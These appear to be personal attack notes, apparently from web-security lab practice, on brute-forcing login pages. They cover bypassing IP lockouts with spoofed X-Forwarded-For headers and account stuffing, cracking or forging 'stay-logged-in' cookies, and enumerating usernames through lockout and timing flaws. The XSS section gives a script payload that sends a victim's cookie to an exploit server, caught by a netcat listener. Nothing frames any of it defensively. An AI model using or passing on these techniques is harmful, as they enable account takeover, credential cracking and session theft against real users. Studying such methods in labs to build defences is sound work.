BRUTE FORCE- BYPASS
### crackstation.net
###--> BE SURE TO DISABLE 'CONCURRENT REQUESTS' ON BRUTEFORCER, OTHERWISE IT WILL TRIGER A LOCKOUT BY SENDING TOO MANY REQUESTS. 
###--> LOOK FOR 'Set-Cookie: HttpOnly; secure' 
	--> IF ABSENT, THE SITE IS OPEN TO XSS, WHERE YOU CAN INSERT .js CODE INTO TO DIVERT TRAFFIC TO A SERVER STEAL THE USERS INFO 
###--> * ["WEAK WALKING"]
	--> ["X-Forwarded-For: 1"] CHECK THE HEADER FOR THE KEY/VALUE ["Connection: close"]and add ["X-Forwarded-For: 1"] to PREVENT TOO MANY ACCESS ATTEMPTS. or
	-->["X-Forwarded-Host: {exploit_server} ]
	
####-> The HttpOnly flag makes cookies inaccessible to client-side scripts, like JavaScript. Those cookies can only be edited by a server that processes the request.
#####################################################
COMMON BRUTEFORCE COUNTERMEASURES
** [TEST FOR IP BLOCK]
	--> TO TEST FOR IP BLOCK, FIND THE LOGIN LIMIT BY DOING A SOFT BRUTE FORCE, AND SEE HOW MANY RESPONSES YOU GET TILL TIME OUT. 
	--> THEN TRY TO LOGIN WITH OWN ACCOUNT, RIGHT BEFORE THE LOGIN LIMIT . IF YOU ARE TIMED OUT, THEN IT IS IP BLOCK.

**[IP-BLOCK SOLUTION-1]**
	* [WEAK HEADERS- "WEAK WALKING"]--> CHECK THE HEADER FOR THE KEY/VALUE ["Connection: close"].
	-> If "Connection: close" present, THEN ADD ["X-Forwarded-For: 1"] (no quotes) (test and change variable accordingly)

	***--> WHEN BRUTFORCING VIA HEADER, ADD THE "X-Forwarded-For: 1" AS A PARAMATER, AND ENUMERATE THE INT VALUE +1 PER REQUEST. 

**[IP-BLOCK SOLUTION-2]**
* [LIST STUFFING]--> TO BYPASS IP BLOCKS, CREATE A VALID ACCOUNT, (OR SEVERAL) AND STUFF THEM INTO THE WORLD LISTS THAT YOU ARE BRUTE FORCING. (BUILD A PYTHON SCRIPT) 

##########################################
[BRUTEFORCE STAY LOGGED IN COOKIE] 
	--> IF EXPLOITED USER NAME USES STAY LOGIN FEATURE, AND YOU KNOW THE VICTIMS USER NAME, THEN YOU CAN BRUTE FORCE THE VICTIMS LOGIN COOKIE BY FIRST GETTING YOUR OWN STAYLOGGEDIN HASH (FROM THE HEADERS), UNWRAPPING IT AND RECREATING IT SO IT CAN BE SENT TO THE SERVER TO BE BRUTE FORCED:
	
	ALTERNATIVLY, IF YOU STEAL THE USERS COOKIES (LOCALLY ETC), THEN YOU CAN JUST UNWRAP THE STAYLOGGEDIN COOKIE HASH AND BRUTE FORCE THE PASSWORD.
-
REQUIRED:
	1. ACTIVE ACCOUNT
	2. EXPLOITED USERNAME 

INFO:
	1. --> [LOG INTO ACCOUNT WITH 'ACTIVE ACCOUNT' (MAKE SURE TO CLICK THAT LITTLE BOX YOU TICK TO 'STAY LOGGED IN')
	
	2. --> [REQUEST HEADER] 
		1. DELETE THE PARAMATER 'session'
		2. THE COOKIE PARAMATER: 'Set-Cookie: stay-logged-in=
		-->THE PARAMATER IS USUALLY A KEY/PAIR [USERNAME:PASSWORD] WHERE THE PASSWORD IS ENCODED WITH MD5 AND AND WRAPPED IN BASE64.
		IE: BASE64(USERNAME(MD5(PASSWORD)))
			1. UNWRAP BASE64 ENCODING (ONLINE OR PROGAMATICALLY)
			2. FIND OUT WHAT KEY HASH ALGOTHIM IS
		
	3 [UNWRAP+SEND OR UNWRAP+BRUTEFORCE]
		** (IF THE VICTIMS COOKIE IS STOLEN) -->
		1. BRUTEFORCE ENCRYPTION USING HASH CAT (OR ONLINE SERVICES) 
			--> [IF BRUTEFORCE SUCCESSFULL, THEN YOU HAVE THE VICTIMS PASSWORD]:
		[END] LOOK FOR 'Set-Cookie: HttpOnly; secure' 
	--> IF ABSENT, THE SITE IS OPEN TO XSS, WHERE YOU CAN INSERT .js CODE INTO THE WEBSITE TO DIVERT TRAFFIC TO A SERVER STEAL THE USERS COOKIE 
		
		** IF DOING COOKIE SESSION SWAP.
		2. USE PYTHON TO RECREATE THE COOKIE HASH USING A PASSWORD LIST 
			--> do not 
			IE: base64(exploited_username:md5(password_list))
			--OR--
		3. USE BURPE / ZAP PROGRAM SCRIPTING TOOLS.
	4. FINALLY, ATTACH THE NEW EXPLOITED_USER_NAME PARAMATERS TO THE HEADER IN: "Cookie: stay-logged-in" (TOP AND BOTTOM OF HEADER) AND ENUMERATE RESPONSES. (MAY HAVE TO DELETE session cookie PARAMATER)
		--> LOOK FOR RESPONSE 200 && RE-RENDER
	[END]

###########################################
## XSS --> COOKIE STEALING / DECRYPTION 
#--> 1 LOOK FOR 'Set-Cookie: HttpOnly; secure' 
	--> IF ABSENT, THE SITE IS OPEN TO XSS, WHERE YOU CAN INSERT .js CODE INTO THE WEBSITE TO DIVERT TRAFFIC TO A SERVER STEAL THE USERS COOKIE 
#2--> SET UP NETCAT TO RECEIVE EXPLOITED COOKIES 
#3--> FIND WHERE 'REFLECTED' PARTS OF WEBSITE ARE (IE, A BLOG POST, WHERE YOU CAN ENTER INFO, AND ITS 'REFLECTED' BACK TO THE PAGE. 
#4--> INSERT JS CODE INTO REFLECTION: <script>document.location='exploit_server_address+folder'+document.cookie</script>
#5--> UNWRAP COOKIE (BASE64), FIND OUT PASSWORD HASH, AND BRUTE FORCE. 


###########################################
ENUMERATE USERNAME FLAW: 
1. TEST IF WRONG USERNAME + NULL PASSWORD RETURNS 'TOO MANY ATTEMPTS'
	--> IF IT DOES NOT, THEN TEST IF THE CORRECT USERNAME ENTERED MULTIPLE TIMES RETURNS A 'TOO MANY ATTEMPTS', IF TRUE, THEN THERE IS A FLAW IN THE LOGIC.
	[FLAW] --> YOU CAN REVERSE TEST THE USERNAME, BY CREATING A LIST OF POTENTIAL USER NAMES, EACH REPEATED ENOUGH SEQUENTIALLY TO TRIGGER THE 'TOO MANY ATTEMPTS' WARNING. IN THIS CASE, THE WARNING WILL INDICATE THAT YOU HAVE FOUND THE USERNAME.
	
	USERNAME_LIST = 
		TED
		TED
		TED # CONTINUE, DID NOT FIND USR NAME
		JOHN
		JOHN
		JOHN # 302, 'TOO MANY ACCESS ATTEMPTS' --> THIS WILL BE THE A VALID USERNAME.
		
###########################################
 BRUTEFORCE POLLING: 
****[BRUTEFORCE--POLLING (USERNAME) ]
* NEEDED: VALID ACCOUNT 
1. TEST (FOR VALID CLIENT NAME: 
	1 --> VALID USERNAME, VALID PASSWORD 
	2 --> VALID USERNAME, INVALID PASSWORD
	3 --> VALID USERNAME, INVALID PASSWORD (LARGER LENGTH) 
	* IF TEST 2 RESPONDS QUICKER THAN TEST 3 THEN, THE SERVER VALIDATES THE USERNAME FIRST, AND THE PASSWORD AFTER . 
	* THIS ALLOWS YOU TO BRUTE FORCE THE USERNAME RESPONSE, AS A LONGER RESPONSE TIME INDICATES THE SERVER HAS VALIDATED THE USERNAME AND IS NOW AUTHENTICATING THE PASSWORD. 

2. BRUTE FORCE PASSWORDS, WITH ATTAINED CLIENT NAME. 
	--> COMEPARE RESPONSE TIME TO TEST #1 
	--> LOOK FOR A 302 RESPONSE 
